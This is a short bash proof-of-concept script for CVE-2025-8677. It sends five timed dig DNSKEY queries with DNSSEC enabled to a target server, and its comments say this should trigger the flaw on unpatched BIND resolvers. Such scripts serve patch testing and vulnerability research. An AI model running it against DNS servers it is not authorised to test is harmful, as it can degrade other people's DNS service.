#!/bin/bash
# CVE-2025-8677 POC Query Script

SERVER="${1:-127.0.0.1}"
DOMAIN="${2:-example.com}"
PORT="${3:-53}"

echo "Querying malformed DNSKEY records from $SERVER:$PORT"
echo "This should trigger CVE-2025-8677 on unpatched BIND servers"
echo ""

# Query DNSKEY records multiple times to trigger the vulnerability
for i in {1..5}; do
    echo "=== Query $i ==="
    echo "Time: $(date '+%Y-%m-%d %H:%M:%S')"

    # Time the query
    START=$(date +%s.%N)

    # Query DNSKEY with DNSSEC validation
    dig @$SERVER -p $PORT +dnssec +multi $DOMAIN DNSKEY

    END=$(date +%s.%N)
    DURATION=$(echo "$END - $START" | bc)

    echo "Query duration: ${DURATION}s"
    echo ""

    sleep 2
done

echo "POC test complete"
